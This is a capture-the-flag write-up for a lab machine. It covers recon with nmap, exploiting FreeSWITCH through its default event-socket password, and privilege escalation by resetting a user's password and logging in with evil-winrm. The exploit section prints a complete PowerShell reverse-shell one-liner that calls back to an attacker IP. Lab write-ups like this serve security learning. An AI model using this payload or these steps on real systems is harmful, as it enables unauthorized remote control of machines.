* [Recon-Enumeration](#recon-enumeration)
* [Exploit](#exploit)
* [Privesc](#privesc)

## Recon-Enumeration  
nmap -A -Pn 10.2.0.17  
![alt text](./img/networked01.PNG?raw=true)  
  
![alt text](./img/networked02.PNG?raw=true)  
  
## Exploit  
searchsploit free switch  
![alt text](./img/networked03.PNG?raw=true)  
  
searchsploit -x windows/remote/47799.txt  
![alt text](./img/networked04.PNG?raw=true)  

Ok, so just create a file with the name “freeswitch-exploit.py” with the above code:  
![alt text](./img/networked05.PNG?raw=true)  
  
Now let’s run the exploit  
![alt text](./img/networked06.PNG?raw=true)  
  
Great, so we are the user mario, let’s try other commands  
./freeswitch-exploit.py 10.2.0.17 "powershell -c Get-Location"  
![alt text](./img/networked07.PNG?raw=true)  
  
So we can execute powershell commands. Let’s try something sneaky :D  
I failed using the exploit to get a reverse shell….so i study the code  
It connect to the target on port 8021, then send the as credential the default password of FreeSwitch and give 2 new lines (enter)  
![alt text](./img/networked08.PNG?raw=true)  
  
So i tried this with netcat  
![alt text](./img/networked09.PNG?raw=true)  
  
Success...after he send the command with “api system COMMAND”  
![alt text](./img/networked10.PNG?raw=true)  
  
So let’s try this too  
![alt text](./img/networked11.PNG?raw=true)  
  
Great, now we can try to get a reverse shell with a powershell script:  
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.2.0.4',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS' + (pwd) + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"  

Start a netcat listener on port 1234 and let’s try to run this script  
![alt text](./img/networked12.PNG?raw=true)  
  
![alt text](./img/networked13.PNG?raw=true)  
HABEMUS SHELL \o/  

Just go to Mario’s desktop and grab the first flag  
![alt text](./img/networked15.PNG?raw=true)  
  
While enumeration we found another user “networked”, and we can found the root.txt on his desktop.  
However we can’t read it  
![alt text](./img/networked18.PNG?raw=true)  

## Privesc  
So let’s get some information to elevate our privileges  
whoami /priv  
![alt text](./img/networked14.PNG?raw=true)  
  
systeminfo  
![alt text](./img/networked16.PNG?raw=true)  
  
net user  
net user mario  
![alt text](./img/networked17.PNG?raw=true)  
 
Ok, so we have authorization to change user password. Let’s try with the user “networked”  
net user networked 123456  
![alt text](./img/networked19.PNG?raw=true)  
 

Well, since we have port 5985 open we can use evil-winrm to connect to it with our new credential  
evil-winrm -i 10.2.0.17 -u networked -p 123456  
![alt text](./img/networked20.PNG?raw=true)  
  
Great, now just grab the flag  
![alt text](./img/networked21.PNG?raw=true)  
 
